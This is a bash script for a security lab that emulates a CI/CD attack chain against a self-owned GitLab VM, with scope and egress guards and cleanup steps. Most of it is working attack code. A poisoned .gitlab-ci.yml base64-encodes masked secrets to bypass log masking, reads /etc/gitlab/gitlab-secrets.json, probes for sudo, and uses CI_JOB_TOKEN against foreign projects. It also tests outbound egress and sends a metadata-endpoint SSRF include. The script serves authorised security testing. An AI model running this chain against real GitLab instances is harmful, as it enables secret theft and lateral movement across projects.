#!/usr/bin/env bash
# cicd-attack-chain.sh — DYNAMIC MITRE ATT&CK CI/CD attack-chain emulation against
# the owned local-lab GitLab VM (http://192.168.122.7, program local-lab).
#
# Threat model: an adversary who has compromised a low-privilege DEVELOPER account
# (token in ~/.gl_role_tokens.env as BOB_TOKEN, access level 30). A Developer cannot
# write CI variables via the API (proven 403 by the kinetic-privesc lane) and cannot
# push to the protected main branch — BUT can push code to a NON-protected branch,
# which executes in CI context on a runner. This lane walks the real kill chain a
# static permission probe cannot reach:
#
#   TA0001 Initial Access     — Valid Accounts (Developer token)              T1078
#   TA0002 Execution          — pipeline poisoning via .gitlab-ci.yml         T1059.004 / T1610
#   TA0006 Credential Access   — masked/protected CI variable exposure         T1552.007
#   TA0008 Lateral Movement    — CI_JOB_TOKEN to foreign projects             T1550.001
#   TA0004 Privilege Escalation — runner -> host pivot (instance secrets)      T1068
#   TA0010 Exfiltration        — egress attempt (MUST be dropped = contained)  T1041
#
# SAFETY (AGENTS.md RoE):
#   - Scope-gated to 192.168.122.7 ONLY, then egress-verified FAIL CLOSED before any
#     write. If the VM can reach off-host, the lane refuses to run.
#   - All writes land on a throwaway attacker branch that is DELETED at the end; the
#     pipelines created are deleted too. No protected ref is modified.
#   - The exfil step is a control test: containment must drop it. A 2xx there is a
#     CRITICAL containment failure and is reported as such.
set -uo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
REPO_ROOT="$(cd -- "${SCRIPT_DIR}/../../../.." >/dev/null 2>&1 && pwd)"

VM_IP="${VM_IP:-192.168.122.7}"; BASE="http://${VM_IP}"; API="${BASE}/api/v4"
PROGRAM="local-lab"
PROJ="${PROJ:-9}"
FOREIGN="${FOREIGN:-1 2}"               # projects the Developer is NOT a member of
SCOPE_FILE="${REPO_ROOT}/programs/${PROGRAM}/scope.yaml"
GUARD="${REPO_ROOT}/.sixth/skills/scope-authorization-guard/scripts/check-scope.mjs"
SCOPE_LIB="${REPO_ROOT}/.sixth/skills/scope-authorization-guard/scripts/scope-lib.sh"
EGRESS_VERIFY="${REPO_ROOT}/.sixth/skills/gitlab-test-vm/scripts/egress-verify.sh"
TOK_ENV="${TOK_ENV:-$HOME/.gl_role_tokens.env}"
SSH_USER="${SSH_USER:-debian}"; SSH_KEY="${SSH_KEY:-$HOME/.ssh/id_ed25519}"

TS="${TS:-$(date +%Y%m%d-%H%M%S)}"
OUT="${OUT:-${REPO_ROOT}/findings/${PROGRAM}/${TS}/cicd-chain}"
mkdir -p "$OUT"
RESULTS="$OUT/RESULTS.txt"; : > "$RESULTS"
ATTACK_BRANCH="ci-attack-${TS}"

c_g=$'\033[1;32m'; c_y=$'\033[1;33m'; c_r=$'\033[1;31m'; c_b=$'\033[1;34m'; c_x=$'\033[0m'
log(){ printf '%s\n' "$*" >&2; }
row(){ printf '%s\n' "$*" | tee -a "$RESULTS" >&2; }
PASS=0; FIND=0; INFO=0
pass(){ PASS=$((PASS+1)); row "${c_g}PASS${c_x}    $*"; }
finding(){ FIND=$((FIND+1)); row "${c_r}FINDING${c_x} $*"; }
info(){ INFO=$((INFO+1)); row "${c_y}INFO${c_x}    $*"; }

# ---- safety preamble --------------------------------------------------------
# shellcheck source=/dev/null
. "$SCOPE_LIB"
scope_guard "$VM_IP" "$SCOPE_FILE" "$GUARD" >/dev/null || { log "${c_r}SCOPE BLOCKED $VM_IP${c_x}"; exit 1; }
log "${c_b}Scope OK: $VM_IP — DYNAMIC CI/CD attack chain (Developer foothold)${c_x}"
VM_IP="$VM_IP" SSH_USER="$SSH_USER" SSH_KEY="$SSH_KEY" bash "$EGRESS_VERIFY" \
  || { log "${c_r}ABORT: VM egress containment UNPROVEN — run egress-lockdown.sh apply.${c_x}"; exit 3; }
log "${c_b}Egress contained — safe to execute poisoned pipelines.${c_x}"

# shellcheck disable=SC1090
. "$TOK_ENV"
DEV_TOK="${BOB_TOKEN:-}"
[ -n "$DEV_TOK" ] || { log "${c_r}BOB_TOKEN missing in $TOK_ENV${c_x}"; exit 1; }
H_DEV=(-H "PRIVATE-TOKEN: ${DEV_TOK}")

api(){ # METHOD PATH [json] -> echoes http code, body to $OUT/.body
  local m="$1" p="$2" d="${3:-}"; local h=("${H_DEV[@]}" -H "Accept: application/json")
  [ -n "$d" ] && h+=(-H "Content-Type: application/json")
  curl -s -o "$OUT/.body" -w '%{http_code}' --max-time 25 -X "$m" "${h[@]}" ${d:+--data "$d"} "$API$p"
}

row "DYNAMIC CI/CD ATT&CK chain — local-lab @ $BASE — $(date -u +%FT%TZ)"
row "Adversary: compromised DEVELOPER (access 30). Attacker branch: ${ATTACK_BRANCH}"
row "========================================================================"

# ---- TA0001 confirm foothold ------------------------------------------------
who="$(api GET "/user")"; uname="$(jq -r '.username' "$OUT/.body" 2>/dev/null)"
lvl="$(api GET "/projects/${PROJ}/members/all/$(jq -r '.id' "$OUT/.body" 2>/dev/null)")"
acc="$(jq -r '.access_level // "?"' "$OUT/.body" 2>/dev/null)"
row "[T1078] foothold identity=${uname} access_level_on_proj${PROJ}=${acc} (Developer=30)"

# ---- TA0002 pipeline poisoning: push malicious .gitlab-ci.yml as Developer ---
log "Creating attacker branch ${ATTACK_BRANCH} from main…"
code="$(api POST "/projects/${PROJ}/repository/branches?branch=${ATTACK_BRANCH}&ref=main")"
if [ "$code" != 201 ]; then
  finding "[T1059.004] Developer could NOT create branch (code=$code) — unexpected; aborting chain"
  jq -c . "$OUT/.body" 2>/dev/null | sed 's/^/    /' >&2
  exit 1
fi
pass "[T1059.004] Developer created non-protected branch ${ATTACK_BRANCH} (expected: Developers may push non-protected refs)"

# Poisoned job. Markers (__TAG__) are parsed from the trace below.
read -r -d '' PAYLOAD <<'YAMLSCRIPT'
set +e
echo "__ID__ user=$(id -un) uid=$(id -u) host=$(hostname)"
# (Credential Access) masking is display-only: transform defeats the [MASKED] filter
echo "__MASK__ present=${MASKED_SECRET:+YES} b64=$(printf %s "$MASKED_SECRET" | base64 -w0) split=${MASKED_SECRET:0:6}__${MASKED_SECRET: -4}"
# (Credential Access) PROTECTED var must NOT be injected on a non-protected branch
echo "__PROT__ present=${PROTECTED_TOKEN:+YES} b64=$(printf %s "$PROTECTED_TOKEN" | base64 -w0)"
# (Privilege Escalation) runner -> host pivot: what can the gitlab-runner user reach?
SUDO=no; sudo -n true 2>/dev/null && SUDO=YES
SEC=no; [ -r /etc/gitlab/gitlab-secrets.json ] && SEC=YES
RB=no;  [ -r /etc/gitlab/gitlab.rb ] && RB=YES
REPOS=$(ls /var/opt/gitlab/git-data/repositories 2>/dev/null | wc -l)
HOMES=$(ls /home 2>/dev/null | tr '\n' ',' )
echo "__PIVOT__ sudo=$SUDO secrets_readable=$SEC gitlab_rb_readable=$RB repo_dirs=$REPOS homes=$HOMES"
if [ "$SEC" = YES ]; then echo "__SECRETS__ $(head -c 240 /etc/gitlab/gitlab-secrets.json | tr -d '\n')"; fi
# (Lateral Movement) use the REAL CI_JOB_TOKEN against foreign projects
for p in 1 2; do
  c=$(curl -s -o /dev/null -w "%{http_code}" -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/$p")
  echo "__JOBTOK__ proj$p=$c"
done
c=$(curl -s -o /tmp/rd -w "%{http_code}" -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects/1/repository/files/README%2Emd/raw?ref=master")
echo "__JOBTOK__ proj1_readme=$c bytes=$(wc -c </tmp/rd 2>/dev/null)"
# (Exfiltration) MUST be dropped by host egress containment
ei=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 https://1.1.1.1/ 2>/dev/null); echo "__EGRESS__ internet_1111=${ei:-000}"
eg=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 https://gitlab.com/ 2>/dev/null); echo "__EGRESS__ gitlabcom=${eg:-000}"
eb=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://192.168.122.1/ 2>/dev/null); echo "__EGRESS__ host_bridge=${eb:-000}"
echo "__DONE__"
exit 0
YAMLSCRIPT

# Wrap the payload as a single YAML literal-block script step (no per-line quoting).
CI_YML="attack:
  tags: [shell]
  script:
    - |
$(printf '%s\n' "$PAYLOAD" | sed 's/^/      /')
"
BODY="$(jq -n --arg b "$ATTACK_BRANCH" --arg c "$CI_YML" '{branch:$b, content:$c, commit_message:"ci"}')"
code="$(api POST "/projects/${PROJ}/repository/files/.gitlab-ci.yml" "$BODY")"
[ "$code" = 201 ] || { finding "[T1610] could not push .gitlab-ci.yml (code=$code)"; jq -c . "$OUT/.body" | sed 's/^/    /' >&2; }
pass "[T1610] poisoned .gitlab-ci.yml pushed to ${ATTACK_BRANCH} (Developer write to CI execution context)"

# ---- wait for pipeline + job trace ------------------------------------------
log "Waiting for pipeline on ${ATTACK_BRANCH}…"
PID=""; for i in $(seq 1 25); do
  api GET "/projects/${PROJ}/pipelines?ref=${ATTACK_BRANCH}" >/dev/null
  PID="$(jq -r '.[0].id // empty' "$OUT/.body" 2>/dev/null)"; [ -n "$PID" ] && break; sleep 2
done
[ -n "$PID" ] || { finding "no pipeline created"; exit 1; }
ST=""; for i in $(seq 1 60); do
  api GET "/projects/${PROJ}/pipelines/${PID}" >/dev/null
  ST="$(jq -r '.status' "$OUT/.body" 2>/dev/null)"
  case "$ST" in success|failed|canceled|skipped) break;; esac; sleep 3
done
api GET "/projects/${PROJ}/pipelines/${PID}/jobs" >/dev/null
JID="$(jq -r '.[0].id // empty' "$OUT/.body" 2>/dev/null)"
TRACE="$OUT/job-${JID}.trace"
curl -s "${H_DEV[@]}" "$API/projects/${PROJ}/jobs/${JID}/trace" -o "$TRACE"
row "[exec] pipeline ${PID} status=${ST}, job ${JID}, trace -> ${TRACE##*/} ($(wc -c <"$TRACE" 2>/dev/null) bytes)"
row "========================================================================"

g(){ grep -m1 -F "$1" "$TRACE" 2>/dev/null; }

# ---- TA0006 masking bypass ---------------------------------------------------
M="$(g '__MASK__')"
mb64="$(sed -n 's/.*b64=\([A-Za-z0-9+/=]*\).*/\1/p' <<<"$M")"
if [ -n "$mb64" ] && [ "$mb64" != "$(printf '' | base64)" ]; then
  dec="$(printf '%s' "$mb64" | base64 -d 2>/dev/null)"
  info "[T1552.007] masking BYPASS — MASKED_SECRET exfiltrated via base64 in job log: '${dec}' (masking is display-only, by design; demonstrates secrets-in-CI are not protected from job code)"
else
  pass "[T1552.007] masked value not recoverable from log"
fi

# ---- TA0006 protected-variable exposure on attacker ref ----------------------
P="$(g '__PROT__')"
if grep -q 'present=YES' <<<"$P"; then
  pb64="$(sed -n 's/.*b64=\([A-Za-z0-9+/=]*\).*/\1/p' <<<"$P")"
  finding "[T1552.007] PROTECTED_TOKEN was injected into a pipeline on a NON-protected branch — protected-variable boundary BYPASS. value(b64)=${pb64}"
else
  pass "[T1552.007] PROTECTED_TOKEN correctly absent on non-protected branch ${ATTACK_BRANCH} (protected-var boundary holds)"
fi

# ---- TA0008 CI_JOB_TOKEN lateral movement ------------------------------------
for p in $FOREIGN; do
  line="$(grep -m1 -F "__JOBTOK__ proj${p}=" "$TRACE")"
  jc="$(sed -n "s/.*proj${p}=\([0-9]*\).*/\1/p" <<<"$line")"
  if [ "$jc" = 200 ]; then
    finding "[T1550.001] CI_JOB_TOKEN from proj${PROJ} READ foreign project ${p} (HTTP 200) — job-token scope boundary BYPASS / lateral movement"
  else
    pass "[T1550.001] CI_JOB_TOKEN denied on foreign project ${p} (HTTP ${jc:-?}) — inbound allowlist holds"
  fi
done
rl="$(g '__JOBTOK__ proj1_readme')"
rc="$(sed -n 's/.*proj1_readme=\([0-9]*\).*/\1/p' <<<"$rl")"
[ "$rc" = 200 ] && finding "[T1550.001] CI_JOB_TOKEN read foreign source file proj1/README (200)" || pass "[T1550.001] CI_JOB_TOKEN denied reading foreign source (${rc:-?})"

# ---- TA0004 runner -> host pivot --------------------------------------------
PV="$(g '__PIVOT__')"
row "[pivot] ${PV#*__PIVOT__ }"
grep -q 'secrets_readable=YES' <<<"$PV" && finding "[T1068] gitlab-runner user can READ /etc/gitlab/gitlab-secrets.json — instance-key compromise from a Developer foothold" || pass "[T1068] gitlab-secrets.json not readable by runner user"
grep -q 'gitlab_rb_readable=YES' <<<"$PV" && finding "[T1068] gitlab-runner user can READ /etc/gitlab/gitlab.rb (may contain secrets)" || pass "[T1068] gitlab.rb not readable by runner user"
grep -q 'sudo=YES' <<<"$PV" && finding "[T1548] gitlab-runner has passwordless sudo — full host takeover" || pass "[T1548] gitlab-runner has no passwordless sudo"
if S="$(g '__SECRETS__')"; then finding "[T1068] instance secrets head captured to trace: ${S:0:60}…"; fi
rd="$(sed -n 's/.*repo_dirs=\([0-9]*\).*/\1/p' <<<"$PV")"
[ "${rd:-0}" -gt 0 ] 2>/dev/null && info "[T1083] gitlab-runner can list ${rd} repo dir(s) under git-data (assess read access to foreign repos)" || pass "[T1083] runner cannot enumerate git-data repositories"

# ---- TA0010 exfiltration / containment proof --------------------------------
for k in internet_1111 gitlabcom; do
  el="$(grep -m1 -F "__EGRESS__ ${k}=" "$TRACE")"
  ec="$(sed -n "s/.*${k}=\([0-9]*\).*/\1/p" <<<"$el")"
  if [ "${ec:-000}" = 000 ]; then
    pass "[T1041] exfil to ${k} DROPPED by containment (code ${ec:-000}) — secret could not leave the host"
  else
    finding "[T1041] CONTAINMENT FAILURE — exfil to ${k} returned ${ec}; VM reached off-host. STOP and re-apply egress-lockdown."
  fi
done
eb="$(grep -m1 -F '__EGRESS__ host_bridge=' "$TRACE")"; ebc="$(sed -n 's/.*host_bridge=\([0-9]*\).*/\1/p' <<<"$eb")"
info "[recon] VM->host-bridge 192.168.122.1 returned ${ebc:-000} (host-local allowed by design for DNS/DHCP)"

# ---- Chain 0: server-side include:remote SSRF guard (runner-less) ------------
row "------------------------------------------------------------------------"
# Use a .yml URL so validation reaches the network/SSRF decision (a non-.yml URL
# is rejected on an extension check before the guard is exercised). Link-local
# 169.254.169.254 is the cloud-metadata SSRF target.
SSRF_YML='include:
  - remote: "http://169.254.169.254/latest.yml"
attack:
  script: [ "true" ]'
LBODY="$(jq -n --arg c "$SSRF_YML" '{content:$c, include_merged:true}')"
lc="$(api POST "/projects/${PROJ}/ci/lint" "$LBODY")"
valid="$(jq -r '.valid // .status // "?"' "$OUT/.body" 2>/dev/null)"
errs="$(jq -rc '.errors // .warnings // []' "$OUT/.body" 2>/dev/null)"
if grep -qiE 'local network|link local|local|private|not allowed|blocked|denied|forbidden' <<<"$errs"; then
  pass "[T1190] include:remote SSRF blocked by GitLab outbound filter (link-local/local network rejected before fetch): ${errs:0:140}"
else
  info "[T1190] include:remote lint valid=${valid} errors=${errs:0:160} — review whether GitLab attempted the fetch (SSRF surface)"
fi

# ---- cleanup ----------------------------------------------------------------
row "------------------------------------------------------------------------"
log "Cleanup: deleting attacker pipelines + branch…"
for pp in $(curl -s "${H_DEV[@]}" "$API/projects/${PROJ}/pipelines?ref=${ATTACK_BRANCH}" | jq -r '.[].id'); do
  curl -s "${H_DEV[@]}" -X DELETE "$API/projects/${PROJ}/pipelines/${pp}" >/dev/null 2>&1 \
    && row "[cleanup] deleted pipeline ${pp}" || row "[cleanup] could not delete pipeline ${pp} (may need owner)"
done
dc="$(api DELETE "/projects/${PROJ}/repository/branches/${ATTACK_BRANCH}")"
[ "$dc" = 204 ] && row "[cleanup] deleted branch ${ATTACK_BRANCH}" || row "[cleanup] branch delete code=${dc} (delete manually if needed)"

row "========================================================================"
row "DYNAMIC CI/CD CHAIN SUMMARY — PASS(control held)=${PASS}  FINDINGS=${FIND}  INFO=${INFO}"
[ "$FIND" -eq 0 ] && row "No exploitable CI/CD gap: secret/lateral/host boundaries enforced; exfil contained." \
                  || row "Review FINDINGS above — real CI/CD gaps surfaced."
echo "$OUT"
